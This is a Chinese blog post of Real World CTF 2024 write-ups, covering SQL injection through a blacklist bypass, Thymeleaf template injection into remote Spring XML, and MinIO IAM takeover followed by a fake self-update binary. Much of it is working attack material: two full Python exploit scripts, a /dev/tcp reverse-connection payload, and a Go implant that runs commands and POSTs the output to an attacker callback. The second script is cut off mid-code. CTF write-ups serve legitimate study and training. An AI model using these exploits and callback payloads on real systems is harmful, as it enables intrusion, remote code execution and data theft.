---
title: Rwctf 2024
slug: rwctf-2024
description: ""
summary: ""
date: 2026-08-29T19:23:56+08:00
lastmod: 2026-08-29T19:23:56+08:00
author: baozongwi
image: ""
categories:
  - CTF
tags: ["Thymeleaf", "MinIO", "GeoServer", "CodeQL"]
keywords: []
---
## 0x01 ChatterBox

附件是 Spring Boot 3.2.2-SNAPSHOT fat jar，Thymeleaf 3.1.2，Druid 1.2.20，jsqlparser 0.8.0，底下 PostgreSQL，SQL 注入+模板注入。

### `/login`

用户名直接拼进 SQL：

```java
@RequestMapping({"/login"})
public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
    String username = request.getParameter("username");
    String password = request.getParameter("passwd");
    if (username != null && password != null) {
        if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
            model.addAttribute("status", 500);
            model.addAttribute("message", "Ban!");
            return "error";
        }
        String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
        if (SQLCheck.check(sql)) {
            try {
                List<String> pass = this.jdbcTemplate.query(sql, new RowMapper<String>() {
                    public String m0mapRow(ResultSet rs, int rowNum) throws SQLException {
                        try {
                            return rs.getString(1) + "/" + rs.getString(2);
                        } catch (java.sql.SQLException e) {
                            throw new RuntimeException(e);
                        }
                    }
                });
                if (!pass.isEmpty()) {
                    String[] info = pass.get(0).split("/");
                    String dbPassword = info[1];
                    if (dbPassword != null && dbPassword.equals(password)) {
                        int userId = Integer.parseInt(info[0]);
                        session.setAttribute("userId", Integer.valueOf(userId));
                        return "redirect:/";
                    }
                    model.addAttribute("status", 500);
                    model.addAttribute("message", "Incorrect Username/Password～");
                    return "error";
                }
                model.addAttribute("status", 500);
                model.addAttribute("message", "Incorrect Username/Password～");
                return "error";
            } catch (Exception var10) {
                model.addAttribute("status", 500);
                model.addAttribute("message", var10.toString());
                return "error";
            }
        }
        model.addAttribute("status", 500);
        model.addAttribute("message", "check error~");
        return "error";
    }
    return "login";
}
```

`checkBlackList` 先 `toUpperCase()` 再 `contains`：

```java
public static boolean checkBlackList(String sql) {
    String sql2 = sql.toUpperCase();
    for (String temp : getBlackList().stream()) {
        if (sql2.contains(temp)) {
            return false;
        }
    }
    return true;
}

private static List<String> getBlackList() {
    List<String> black = new ArrayList<>();
    black.add("SELECT");
    black.add("UNION");
    black.add("INSERT");
    black.add("ALTER");
    black.add("SLEEP");
    black.add("DELETE");
    black.add("--");
    black.add(";");
    black.add("#");
    black.add("&");
    black.add("/*");
    black.add("OR");
    black.add("EXEC");
    black.add("CREATE");
    black.add("AND");
    black.add("DROP");
    black.add("DO");
    black.add("COPY");
    black.add("SET");
    black.add("VACUUM");
    black.add("SHOW");
    black.add("CURSOR");
    black.add("TRUNCATE");
    black.add("CAST");
    black.add("BEGIN");
    black.add("PERFORM");
    black.add("END");
    black.add("CASE");
    black.add("WHEN");
    black.add("ALL");
    black.add("TABLE");
    black.add("UPDATE");
    black.add("TRIGGER");
    black.add("FUNCTION");
    black.add("PROCEDURE");
    black.add("DECLARE");
    black.add("RETURNING");
    black.add("TABLESPACE");
    black.add("VIEW");
    black.add("SEQUENCE");
    black.add("INDEX");
    black.add("LOCK");
    black.add("GRANT");
    black.add("REVOKE");
    black.add("SAVEPOINT");
    black.add("ROLLBACK");
    black.add("IMPORT");
    black.add("COMMIT");
    black.add("PREPARE");
    black.add("EXECUTE");
    black.add("EXPLAIN");
    black.add("ANALYZE");
    black.add("DATABASE");
    black.add("PASSWORD");
    black.add("CONNECT");
    black.add("DISCONNECT");
    black.add("PG_SLEEP");
    black.add("MERGE");
    black.add("USING");
    black.add("LIMIT");
    black.add("OFFSET");
    black.add("RETURN");
    black.add("ESCAPE");
    black.add("LIKE");
    black.add("ILIKE");
    black.add("RLIKE");
    black.add("EXISTS");
    black.add("BETWEEN");
    black.add("IS");
    black.add("NULL");
    black.add("NOT");
    black.add("GROUP");
    black.add("BY");
    black.add("HAVING");
    black.add("ORDER");
    black.add("WINDOW");
    black.add("PARTITION");
    black.add("OVER");
    black.add("FOREIGN KEY");
    black.add("REFERENCE");
    black.add("RAISE");
    black.add("LISTEN");
    black.add("NOTIFY");
    black.add("LOAD");
    black.add("SECURITY");
    black.add("OWNER");
    black.add("RULE");
    black.add("CLUSTER");
    black.add("COMMENT");
    black.add("CONVERT");
    black.add("COPY");
    black.add("CHECKPOINT");
    black.add("REINDEX");
    black.add("RESET");
    black.add("LANGUAGE");
    black.add("PLPGSQL");
    black.add("PLPYTHON");
    black.add("SECDEF");
    black.add("NOCREATEDB");
    black.add("NOCREATEROLE");
    black.add("NOINHERIT");
    black.add("NOREPLICATION");
    black.add("BYPASSRLS");
    black.add("FILE");
    black.add("PG_");
    black.add("IMPORT");
    black.add("EXPORT");
    return black;
}
```

过了黑名单还有 `check()`，整句再转大写，三层：

```java
public static boolean check(String sql) {
    return checkValid(sql.toUpperCase());
}
```


```java
private static boolean checkValid(String sql) {
    try {
        return SQLParser.parse(sql);
    } catch (SQLException e) {
        try {
            List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);
            if (sqlStatements != null && sqlStatements.size() > 1) {
                return false;
            }
            for (SQLStatement sQLStatement : sqlStatements.stream()) {
                if (sQLStatement instanceof PGSelectStatement) {
                    SQLSelectQueryBlock query = ((SQLSelectStatement) sQLStatement).getSelect().getQuery();
                    if (query instanceof SQLUnionQuery) {
                        return false;
                    }
                    if (!filtetFields(query.getSelectList()) || !filterTableName(query.getFrom()).booleanValue() || !filterWhere(query.getWhere())) {
                        return false;
                    }
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            if (filter(sql)) {
                return true;
            }
            throw new SQLException("SQL Parsing Exception~");
        }
    }
}

public static boolean filter(String sql) {
    if (StringUtil.matches(sql, "^[a-zA-Z0-9_]*$") || sql.contains(" USER_DEFINE ")) {
        return true;
    }
    if (sql.startsWith("SELECT") && sql.contains("VIEW")) {
        return true;
    }
    for (String whitePrefix : getWhitePrefix().stream()) {
        if (sql.startsWith(whitePrefix)) {
            return true;
        }
    }
    return false;
}
```

jsqlparser 0.8 吃不下 `$$` 和 `::integer` 会抛出错误，Druid 1.2.20 解析 PG 的 `$$` 也会跟着炸， [alibaba/druid#5449](https://github.com/alibaba/druid/issues/5449)。
两层都炸就掉进 `filter()`，payload 里塞 ` USER_DEFINE ` 就放行，也就能够sql注入了。

再用 `::integer` 把 `t`/`f` 转成数字，匹配时 Postgres 报 `invalid input syntax for type integer: "t"`，变成 `DataIntegrityViolationException`；不匹配就是普通的 Incorrect Username/Password。

- 条件为真 → 故意让 t::integer 报错
- 条件为假 → 让 1::integer 正常执行

也就是报错布尔盲注了，payload如下

```
'||substr(ltrim(array_to_string(array[$$ USER_DEFINE $$||'x'=$$ USER_DEFINE $$||substr(passwd,1,1),1=2],'1',''),'f'),1,1)::integer||'
```

账号是 `admin`，密码是 `xxxxxxx`。

### `/notify`


```java
private String templatePrefix = "file:///non_exists/";
private String templateSuffix = ".html";

@GetMapping({"/notify"})
public String notify(@RequestParam String fname, HttpSession session) throws IOException {
    InputStream inputStream;
    Integer userId = (Integer) session.getAttribute("userId");
    if (userId != null && userId.intValue() == 1) {
        if (!fname.contains("../") && (inputStream = this.applicationContext.getResource(this.templatePrefix + fname + this.templateSuffix).getInputStream()) != null && safeCheck(inputStream)) {
            String result = getTemplateEngine().process(fname, new Context());
            return result;
        }
        return "error";
    }
    return "redirect:login";
}

public boolean safeCheck(InputStream stream) {
    try {
        String templateContent = new String(stream.readAllBytes());
        return (templateContent.contains("<") || templateContent.contains(">") || templateContent.contains("org.apache") || templateContent.contains("org.spring")) ? false : true;
    } catch (IOException e) {
        return false;
    }
}

private SpringTemplateEngine getTemplateEngine() {
    SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
    resolver.setApplicationContext(this.applicationContext);
    resolver.setTemplateMode(TemplateMode.HTML);
    resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
    resolver.setPrefix(this.templatePrefix);
    resolver.setSuffix(this.templateSuffix);
    SpringTemplateEngine templateEngine = new SpringTemplateEngine();
    templateEngine.setTemplateResolver(resolver);
    return templateEngine;
}
```

`contains("../")` 只认正斜杠。Spring 6.1 `ResourceUtils.toURL` 会 `StringUtils.cleanPath`，反斜杠先换成 `/` 再消 `..`。所以 `fname=..\tmp\p` 实际打开 `/tmp/p.html`。

`fname=..\etc\passwd#` 或 `?` 吃掉 `.html` 后缀之后，Thymeleaf 会把文件内容当成 view name。HTTP 只有 500 JSON，但是容器日志里有 `Error resolving template [root:x:0:0:root:/root:/bin/bash`，当不了回显。所以命令其实执行了。

`safeCheck` 拒尖括号，表达式用 `[[${...}]]`。Thymeleaf 3.1.2 的 ACL 在 `ExpressionUtils`：

```java
BLOCKED_ALL_PURPOSES_PACKAGE_NAME_PREFIXES = new HashSet(Arrays.asList(
    "java.", "javax.", "jakarta.", "jdk.", "org.ietf.jgss.", "org.omg.",
    "org.w3c.dom.", "org.xml.sax.", "com.sun.", "sun."));
BLOCKED_TYPE_REFERENCE_PACKAGE_NAME_PREFIXES = new HashSet(Arrays.asList(
    "com.squareup.javapoet.", "net.bytebuddy.", "net.sf.cglib.", "javassist.",
    "javax0.geci.", "org.apache.bcel.", "org.aspectj.", "org.javassist.",
    "org.mockito.", "org.objectweb.asm.", "org.objenesis.",
    "org.springframework.aot.", "org.springframework.asm.",
    "org.springframework.cglib.", "org.springframework.javapoet.",
    "org.springframework.objenesis.", "org.springframework.web.",
    "org.springframework.webflow.", "org.springframework.context.",
    "org.springframework.beans.", "org.springframework.aspects.",
    "org.springframework.aop.", "org.springframework.expression.",
    "org.springframework.util."));
```

`T(java.lang.Runtime)` 和 `T(org.springframework.context.support.ClassPathXmlApplicationContext)` 都被挡。`T(com.zaxxer.hikari.util.UtilityElf)` 不在名单里。`createInstance` 自己 `loadClass`：

```java
public static <T> T createInstance(java.lang.String className, java.lang.Class<T> clazz, java.lang.Object... args) {
    if (className == null) {
        return null;
    }
    try {
        java.lang.Class<?> loaded = com.zaxxer.hikari.util.UtilityElf.class.getClassLoader().loadClass(className);
        if (args.length == 0) {
            return clazz.cast(loaded.getDeclaredConstructor(new java.lang.Class[0]).newInstance(new java.lang.Object[0]));
        }
        java.lang.Class<?>[] argClasses = new java.lang.Class[args.length];
        for (int i = 0; i < args.length; i++) {
            argClasses[i] = args[i].getClass();
        }
        java.lang.reflect.Constructor<?> constructor = loaded.getConstructor(argClasses);
        return clazz.cast(constructor.newInstance(args));
    } catch (java.lang.Exception e) {
        throw new java.lang.RuntimeException(e);
    }
}
```

类名拆开拼，加载远程 XML：

```
[[${T(com.zaxxer.hikari.util.UtilityElf).createInstance('org.sprin'+'gframework.context.support.ClassPathXmlApplicationContext',''.getClass().forName('org.sprin'+'gframework.context.support.ClassPathXmlApplicationContext'),'http://<lhost>:18083/2.xml')}]]
```

后台 `/post_message` 注入 `query_to_xml` + `lo_from_bytea` / `lo_export` 把模板写到 `/tmp/p.html`，`fname=..\tmp\p`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>/bin/bash</value>
<value>-c</value>
<value>exec 3&lt;&gt;/dev/tcp/&lt;lhost&gt;/18082; /bin/bash -c '/readflag' &gt;&amp;3 2&gt;&amp;3</value>
</list>
</constructor-arg>
</bean>
</beans>
```

方法返回值被当成 view name，页面 500 不影响命令已经执行。

exp 如下

```python
#!/usr/bin/env python3
import argparse
import html
import os
import re
import socket
import string
import sys
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler

import requests


class Quiet(SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return


def fail(r):
    print(r.status_code)
    print(html.unescape(re.sub(r"<[^>]+>", " ", r.text))[:800])
    sys.exit(1)


def victim_host(target, lhost):
    th = target.split(":")[0]
    if lhost in ("127.0.0.1", "localhost", "::1") and th in ("127.0.0.1", "localhost", "::1"):
        return "host.docker.internal"
    return lhost


def extract_password(base):
    s = requests.Session()
    s.get(base + "/login", timeout=10)
    pw = ""
    alphabet = [c for c in string.printable if c not in "'\\\r\n\t"]
    for i in range(1, 48):
        hit = False
        for ch in alphabet:
            u = (
                "'||substr(ltrim(array_to_string(array[$$ USER_DEFINE $$||'%s'=$$ USER_DEFINE $$||substr(passwd,%d,1),1=2],'1',''),'f'),1,1)::integer||'"
                % (ch, i)
            )
            r = s.post(base + "/login", data={"username": u, "passwd": "x"}, timeout=10)
            if "DataIntegrityViolationException" in r.text:
                pw += ch
                hit = True
                break
        if not hit:
            break
    if not pw:
        sys.exit(1)
    return pw


def login(base, pw):
    s = requests.Session()
    r = s.post(base + "/login", data={"username": "admin", "passwd": pw}, timeout=10)
    if s.cookies.get("JSESSIONID") is None:
        fail(r)
    return s


def pg_exec(sess, base, query):
    wrapped = "encode(decode('%s','hex'),'esc'||'ape')" % query.encode().hex()
    content = (
        "'||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||(query_to_xml(%s,true,true,''))||'"
        % wrapped
    )
    return sess.post(base + "/post_message", data={"content": content}, timeout=20)


def plant(sess, base, data, path, oid):
    pg_exec(sess, base, "SELECT lo_unlink(%d)" % oid)
    pg_exec(
        sess,
        base,
        "SELECT lo_from_bytea(%d, decode('%s', 'hex'))" % (oid, data.encode().hex()),
    )
    r = pg_exec(sess, base, "SELECT lo_export(%d, '%s')" % (oid, path))
    if r.status_code not in (200, 302):
        fail(r)
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", default="127.0.0.1:18088")
    ap.add_argument("--lhost", default="127.0.0.1")
    ap.add_argument("-c", default="/readflag")
    ap.add_argument("--http-port", type=int, default=0)
    ap.add_argument("--cb-port", type=int, default=0)
    args = ap.parse_args()
    vh = victim_host(args.target, args.lhost)
    xml_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_xml")
    os.makedirs(xml_dir, exist_ok=True)
    httpd = HTTPServer(("0.0.0.0", args.http_port), lambda *a, **k: Quiet(*a, directory=xml_dir, **k))
    http_port = httpd.socket.getsockname()[1]
    cbs = socket.socket()
    cbs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cbs.bind(("0.0.0.0", args.cb_port))
    cbs.listen(5)
    cbs.settimeout(25)
    cb_port = cbs.getsockname()[1]
    xml_url = "http://%s:%d/2.xml" % (vh, http_port)
    payload = (
        "[[${T(com.zaxxer.hikari.util.UtilityElf).createInstance("
        "'org.sprin'+'gframework.context.support.ClassPathXmlApplicationContext',"
        "''.getClass().forName('org.sprin'+'gframework.context.support.ClassPathXmlApplicationContext'),"
        "'%s')}]]" % xml_url
    )
    cmd = args.c.replace("'", "'\\''")
    inner = (
        "exec 3<>/dev/tcp/%s/%d; /bin/bash -c '%s' >&3 2>&3"
        % (vh, cb_port, cmd)
    )
    inner = inner.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    beans = """<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="java.lang.ProcessBuilder" init-method="start">
<constructor-arg>
<list>
<value>/bin/bash</value>
<value>-c</value>
<value>%s</value>
</list>
</constructor-arg>
</bean>
</beans>
""" % inner
    with open(os.path.join(xml_dir, "2.xml"), "w") as f:
        f.write(beans)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    got = {"d": None}

    def tcps():
        try:
            c, _ = cbs.accept()
            c.settimeout(5)
            data = b""
            while True:
                try:
                    b = c.recv(4096)
                    if not b:
                        break
                    data += b
                except Exception:
                    break
            got["d"] = data
            c.close()
        except Exception:
            pass
        cbs.close()

    threading.Thread(target=tcps, daemon=True).start()
    time.sleep(0.2)
    base = "http://" + args.target
    sess = login(base, extract_password(base))
    plant(sess, base, payload, "/tmp/p.html", int(time.time()) % 800000 + 200000)
    r = sess.get(base + "/notify", params={"fname": r"..\tmp\p"}, timeout=20)
    for _ in range(50):
        if got["d"]:
            sys.stdout.buffer.write(got["d"])
            if not got["d"].endswith(b"\n"):
                sys.stdout.write("\n")
            httpd.shutdown()
            return
        time.sleep(0.25)
    fail(r)


if __name__ == "__main__":
    main()

# python3 ./exp/exp_chatterbox.py -t 127.0.0.1:18088 --lhost 127.0.0.1 -c 'whoami;id'
# python3 ./exp/exp_chatterbox.py -t 127.0.0.1:18088 --lhost 127.0.0.1 -c /readflag

```


## 0x02 minioday

打开 `.minio.sys/config/iam/`：

```
config/iam/
├── format.json/xl.meta
├── service-accounts/Vmd6q3aw2eOEmZ6l/identity.json/xl.meta
└── sts/QBUDBMG8E1HI5QOLTWZL/identity.json/xl.meta
```

对象内容嵌在 `xl.meta` 里，`strings` 直接抠。service-account 这份：

```json
{
  "version": 1,
  "credentials": {
    "accessKey": "Vmd6q3aw2eOEmZ6l",
    "secretKey": "eeuG1b8vW15TPpaN1fP9funQJdDG5wQy",
    "sessionToken": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJWbWQ2cTNhdzJlT0VtWjZsIiwicGFyZW50IjoicndjdGYiLCJzYS1wb2xpY3kiOiJlbWJlZGRlZC1wb2xpY3kiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZLaUpkTENKU1pYTnZkWEpqWlNJNld5SmhjbTQ2WVhkek9uTXpPam82S2lKZGZWMTkifQ.ptjboEMwWhfvl16Jy1gVpinTN7CpFjpy1NKO50RKkjjwzZfvFw-a7-mQnyjFeekxGLqhfIiC6az2kfA1E_Z6qg",
    "expiration": "1970-01-01T00:00:00Z",
    "status": "on",
    "parentUser": "rwctf"
  },
  "updatedAt": "2023-11-15T05:38:23.652266083Z"
}
```

`sessionToken` 是 HS512 JWT。header / payload：

```json
{"alg":"HS512","typ":"JWT"}
```

```json
{
  "accessKey": "Vmd6q3aw2eOEmZ6l",
  "parent": "rwctf",
  "sa-policy": "embedded-policy",
  "sessionPolicy": "eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6KiJdLCJSZXNvdXJjZSI6WyJhcm46YXdzOnMzOjo6KiJdfV19"
}
```

`sessionPolicy` 再 base64 一次：

```json
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:*"],"Resource":["arn:aws:s3:::*"]}]}
```

parent 是 `rwctf`，权限是 `s3:*` 打 `arn:aws:s3:::*`，不是 consoleAdmin。STS 那份 `expiration` 已经是 `2023-11-15T17:37:15Z`，过期了。先写 IAM 拿 admin，再走不验签的 `update`。

### `.minio.sys`

这把 `s3:*` 刚好够打 [GHSA-2pxw-r47w-4p8c](https://github.com/minio/minio/security/advisories/GHSA-2pxw-r47w-4p8c)。`Content-Type` 最后一个 `a` 改成 `A`，UA 带 Mozilla。policy 不带 expiration 会 `PostPolicyInvalidKeyName`。

```text
.minio.sys/
└── config/
    └── iam/
        ├── users/
        │   └── iLHVV2ZMFuwf7SmH/
        │       └── identity.json
        │
        └── policydb/
            └── users/
                └── iLHVV2ZMFuwf7SmH.json
```

创建一个用户，绑定 consoleAdmin 权限。恶意 Policy 如下

```json
{"expiration": "2099-01-01T00:00:00.000Z", "conditions": [["eq", "$bucket", ".minio.sys"], ["starts-with", "$key", ""]]}
```

写 `identity.json`：

```http
POST /.minio.sys HTTP/1.1
Host: 127.0.0.1:19000
User-Agent: Mozilla/5.0
Content-Type: multipart/form-datA; boundary=----RWCTFMinio
Content-Length: 873

------RWCTFMinio
Content-Disposition: form-data; name="key"

config/iam/users/iLHVV2ZMFuwf7SmH/identity.json
------RWCTFMinio
Content-Disposition: form-data; name="Policy"

eyJleHBpcmF0aW9uIjogIjIwOTktMDEtMDFUMDA6MDA6MDAuMDAwWiIsICJjb25kaXRpb25zIjogW1siZXEiLCAiJGJ1Y2tldCIsICIubWluaW8uc3lzIl0sIFsic3RhcnRzLXdpdGgiLCAiJGtleSIsICIiXV19
------RWCTFMinio
Content-Disposition: form-data; name="AWSAccessKeyId"

Vmd6q3aw2eOEmZ6l
------RWCTFMinio
Content-Disposition: form-data; name="Signature"

gCbtFeHHITWO7s57cIg5Y8/g3hg=
------RWCTFMinio
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/json

{"version":1,"credentials":{"accessKey":"iLHVV2ZMFuwf7SmH","secretKey":"aODcevBptB0hQychqcH569miG78euGbZ","status":"on","expiration":"1970-01-01T00:00:00Z"},"updatedAt":"2024-01-27T14:29:34.662930444Z"}
------RWCTFMinio--
```

第二包，写 `policydb` 绑 `consoleAdmin`：

```http
POST /.minio.sys HTTP/1.1
Host: 127.0.0.1:19000
User-Agent: Mozilla/5.0
Content-Type: multipart/form-datA; boundary=----RWCTFMinio
Content-Length: 758

------RWCTFMinio
Content-Disposition: form-data; name="key"

config/iam/policydb/users/iLHVV2ZMFuwf7SmH.json
------RWCTFMinio
Content-Disposition: form-data; name="Policy"

eyJleHBpcmF0aW9uIjogIjIwOTktMDEtMDFUMDA6MDA6MDAuMDAwWiIsICJjb25kaXRpb25zIjogW1siZXEiLCAiJGJ1Y2tldCIsICIubWluaW8uc3lzIl0sIFsic3RhcnRzLXdpdGgiLCAiJGtleSIsICIiXV19
------RWCTFMinio
Content-Disposition: form-data; name="AWSAccessKeyId"

Vmd6q3aw2eOEmZ6l
------RWCTFMinio
Content-Disposition: form-data; name="Signature"

gCbtFeHHITWO7s57cIg5Y8/g3hg=
------RWCTFMinio
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/json

{"version": 1, "policy": "consoleAdmin", "updatedAt": "2024-01-27T14:29:34.662930444Z"}
------RWCTFMinio--
```

两包都 204。轮询 `/minio/admin/v3/info` 等重载成功，回显 200 再打 update。

### `/minio/admin/v3/update`

题目环境没验签，故意置空的，官方镜像默认公钥是`RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav`，空字符串之后 `verifyBinary` 跳过 minisig，只核 sha256。

`POST /minio/admin/v3/update?updateURL=` 是 MinIO 自己的升级协议，先 GET `updateURL` 拿到一行 sha256sum，再按同目录下载第二个字段那个文件名。`cmd/update.go` 的 `parseReleaseData` 要这种格式：

```
<sha256>  minio.RELEASE.2016-10-07T01-16-39Z
```

假二进制用 `minio.RELEASE.2024-01-27T16-46-00Z` 只是凑这个文件名。`selfupdate` 换掉 `/usr/bin/minio` 后重启，假 minio 跑 `-c` 再 POST 回来：

```go
package main

import (
	"bytes"
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

var callback string
var cmdB64 string

func main() {
	cmd := "cat /flag"
	if cmdB64 != "" {
		if b, err := base64.StdEncoding.DecodeString(cmdB64); err == nil && len(b) > 0 {
			cmd = string(b)
		}
	}
	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		out = append(out, []byte(err.Error())...)
	}
	url := os.Getenv("FLAG_CB")
	if url == "" {
		url = callback
	}
	if url == "" {
		os.Exit(1)
	}
	for i := 0; i < 12; i++ {
		req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(out))
		if err == nil {
			req.Header.Set("Content-Type", "text/plain")
			req.ContentLength = int64(len(out))
			resp, err2 := http.DefaultClient.Do(req)
			if err2 == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				break
			}
		}
		time.Sleep(time.Millisecond * 400)
	}
	for {
		time.Sleep(time.Hour)
	}
}

```

exp 如下

```python
#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import os
import platform
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote

import requests

ACCESS = "Vmd6q3aw2eOEmZ6l"
SECRET = "eeuG1b8vW15TPpaN1fP9funQJdDG5wQy"
NEW_AK = "iLHVV2ZMFuwf7SmH"
NEW_SK = "aODcevBptB0hQychqcH569miG78euGbZ"
FLAG = {"data": None}
RELNAME = "minio.RELEASE.2024-01-27T16-46-00Z"


def victim_host(target, lhost):
    th = target.split(":")[0]
    if lhost in ("127.0.0.1", "localhost", "::1") and th in ("127.0.0.1", "localhost", "::1"):
        return "host.docker.internal"
    return lhost


def detect_goarch():
    m = platform.machine().lower()
    if "arm" in m or "aarch" in m:
        return "arm64"
    return "amd64"


def b64_hmac(secret, msg):
    return base64.b64encode(hmac.new(secret.encode(), msg, hashlib.sha1).digest()).decode()


def post_policy(api, key_path, body):
    policy = base64.b64encode(
        json.dumps(
            {
                "expiration": "2099-01-01T00:00:00.000Z",
                "conditions": [
                    ["eq", "$bucket", ".minio.sys"],
                    ["starts-with", "$key", ""],
                ],
            }
        ).encode()
    )
    boundary = "----RWCTFMinio"
    fields = [
        ("key", key_path),
        ("Policy", policy.decode()),
        ("AWSAccessKeyId", ACCESS),
        ("Signature", b64_hmac(SECRET, policy)),
    ]
    parts = []
    for name, value in fields:
        parts.append(
            "--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
            % (boundary, name, value)
        )
    parts.append(
        "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\nContent-Type: application/json\r\n\r\n"
        % boundary
    )
    raw = "".join(parts).encode() + body + ("\r\n--%s--\r\n" % boundary).encode()
    return requests.post(
        api + "/.minio.sys",
        data=raw,
        headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "multipart/form-datA; boundary=" + boundary,
        },
        timeout=15,
    )


def aws_sign(method, host, path, query_pairs, access, secret, body=b""):
    now = datetime.now(timezone.utc)
    amz = now.strftime("%Y%m%dT%H%M%SZ")
    datestamp = now.strftime("%Y%m%d")
    payload_hash = hashlib.sha256(body).hexdigest()
    canonical_query = "&".join(
        "%s=%s" % (quote(k, safe="-_.~"), quote(v, safe="-_.~"))
        for k, v in sorted(query_pairs)
    )
    headers = {
        "host": host,
        "x-amz-content-sha256": payload_hash,
        "x-amz-date": amz,
    }
    signed = ";".join(sorted(headers))
    canonical_headers = "".join("%s:%s\n" % (k, headers[k]) for k in sorted(headers))
    canonical = "%s\n%s\n%s\n%s\n%s\n%s" % (
        method,
        path,
        canonical_query,
        canonical_headers,
        signed,
        payload_hash,
    )
    scope = "%s/us-east-1/s3/aws4_request" % datestamp
    sts = "AWS4-HMAC-SHA256\n%s\n%s\n%s" % (
        amz,
        scope,
        hashlib.sha256(canonical.encode()).hexdigest(),
    )

    def hs(key, msg):
        return hmac.new(key, msg if isinstance(msg, bytes) else msg.encode(), hashlib.sha256).digest()

    k = hs(hs(hs(hs(("AWS4" + secret).encode(), datestamp), "us-east-1"), "s3"), "aws4_request")
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    return {
        "x-amz-content-sha256": payload_hash,
        "x-amz-date": amz,
        "Authorization": "AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s"
        % (access, scope, signed, sig),
    }, canonical_query


class Handler(BaseHTTPRequestHandler):
    blob = b""
    name = ""
    digest_line = b""

    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        if "sha256sum" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(self.digest_line)))
            self.end_headers()
            self.wfile.write(self.digest_line)
            return
        if self.name in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(self.blob)))
            self.end_headers()
            self.wfile.write(self.blob)
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        FLAG["data"] = self.rfile.read(n)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


def fail(r):
    print(r.status_code)
    print(r.text[:800])
    sys.exit(1)


def build_fake(src, callback, cmd, goarch):
    outdir = tempfile.mkdtemp(prefix="mfake_")
    out = os.path.join(outdir, RELNAME)
    b64 = base64.b64encode(cmd.encode()).decode()
    env = os.environ.copy()
    env["CGO_ENABLED"] = "0"
    env["GOOS"] = "linux"
    env["GOARCH"] = goarch
    subprocess.check_call(
        [
            "go",
            "build",
            "-ldflags",
            "-s -w -X main.callback=%s -X main.cmdB64=%s" % (callback, b64),
            "-o",
            out,
            src,
        ],
        cwd=os.path.dirname(src) or ".",
        env=env,
    )
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", default="127.0.0.1:19000")
    ap.add_argument("--lhost", default="127.0.0.1")
    ap.add_argument("-c", default="cat /flag")
    ap.add_argument("--callback-port", type=int, default=0)
    ap.add_argument("--goarch", default=detect_goarch())
    args = ap.parse_args()
    vh = victim_host(args.target, args.lhost)
    api = "http://" + args.target
    host = args.target
    httpd = HTTPServer(("0.0.0.0", args.callback_port), Handler)
    cb_port = httpd.socket.getsockname()[1]
    cb = "http://%s:%d/flag" % (vh, cb_port)
    identity = json.dumps(
        {
            "version": 1,
            "credentials": {
                "accessKey": NEW_AK,
                "secretKey": NEW_SK,
                "status": "on",
                "expiration": "1970-01-01T00:00:00Z",
            },
